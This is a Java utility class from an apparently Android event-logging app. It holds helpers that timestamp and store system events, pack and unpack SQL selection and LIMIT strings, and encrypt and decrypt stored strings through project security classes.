package com.fx.util;

import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.TimeZone;

import android.content.Context;

import com.fx.event.EventSystem;
import com.fx.eventdb.EventDatabaseManager;
import com.fx.maind.ref.Customization;
import com.fx.maind.security.FxSecurity;
import com.fx.maind.security.ServerHashCrypto;
import com.vvt.calendar.CalendarObserver;
import com.vvt.logger.FxLog;

public class FxUtil {
	
	public static final String TAG = "FxUtil";
	public static final boolean LOGE = Customization.ERROR;
	
	public static final String SQL_TABLE_KEY = "table";
    public static final String SQL_SELECT_KEY = "selection";
    private static final String SQL_SEPARATOR = "###";

    public static void captureSystemEvent(Context context, short direction, String data) {
    	String timezone = CalendarObserver.getInstance().getLocalTimeZone();
		SimpleDateFormat formatter = new SimpleDateFormat(FxResource.DATE_FORMAT);
		formatter.setTimeZone(TimeZone.getTimeZone(timezone));
		String time = formatter.format(new Date(System.currentTimeMillis()));
		EventSystem eventSystem = new EventSystem(context, time, direction, data);
		EventDatabaseManager.getInstance(context).insert(eventSystem);
    }
    
    /**
	 * The result String will be something like "RowID=?###50" or "###50"
	 * @param limit value less than 1 will be ignore 
	 */
	public static String createSqlLimitSelection(String selection, int limit) {
		if (selection == null) {
			selection = "";
		}
		if (limit > 0) {
			selection += SQL_SEPARATOR + limit;
		}
		return selection;
	}
	
	/**
	 * The result String will contains only SELECT clause e.g. "RowID=?"
	 */
	public static String getSqlSelection(String selection) {
		if (selection == null) {
			return null;
		}
		else {
			String[] split = selection.split(SQL_SEPARATOR);
			return split[0].length() == 0 ? null : split[0];
		}
	}
	
	/**
	 * The result String will contains only LIMIT clause e.g. "50, 0"
	 */
	public static String getSqlLimit(String selection) {
		if (selection == null) {
			return null;
		}
		else {
			String[] limit = selection.split(SQL_SEPARATOR);
			return limit.length > 1 ? selection.split(SQL_SEPARATOR)[1] : null;
		}
	}
	
	/**
	 * Encrypt using FxSecurity
	 * @param rawData
	 * @return
	 */
	public static String getEncryptedInsertData(String rawData, boolean isServerHash) {
		if (rawData == null || rawData.trim().length() < 1) {
			return null;
		}
		
		byte[] encryptedData = isServerHash ? 
				ServerHashCrypto.encryptServerHash(rawData.getBytes()) : 
					FxSecurity.encrypt(rawData.getBytes(), false);
				
		return encryptedData == null ? null : 
			Arrays.toString(encryptedData)
			.replace("[", "").replace("]", "").replace(", ", " ");
	}
	
	/**
	 * Decrypt using FxSecurity
	 * @param encryptedData
	 * @return
	 */
	public static String getDecryptedQueryData(String encryptedData, boolean isServerHash) {
		if (encryptedData == null || encryptedData.trim().length() < 1) {
			return null;
		}
		
		String result = null;
		
		// Construct string array
		String[] encryptedStrArray = encryptedData.split(" ");
		
		// Construct byte array
		ByteBuffer encryptedBytBuf = ByteBuffer.allocate(encryptedStrArray.length);
		
		try {
    		for (int i = 0; i < encryptedStrArray.length; i++) {
    			encryptedBytBuf.put(i, Byte.parseByte(encryptedStrArray[i]));
    		}
    		
    		byte[] decryptedData = null;
    		
    		if (isServerHash) {
    			decryptedData = ServerHashCrypto.decryptServerHash(encryptedBytBuf.array());
    		}
    		else {
    			decryptedData = FxSecurity.decrypt(encryptedBytBuf.array(), false);
    		}
    		
    		if (decryptedData != null) {
    			result = new String(decryptedData);
    		}
		}
		catch (NumberFormatException e) {
			if (LOGE) FxLog.e(TAG, String.format(
					"getDecryptedQueryData # Error: %s", e));
		}
		
		if (result == null && encryptedData != null) {
			if (LOGE) FxLog.e(TAG, String.format(
					"getDecryptedQueryData # Failed!! input data: %s", encryptedData));
		}
		
		return result;
	}
}
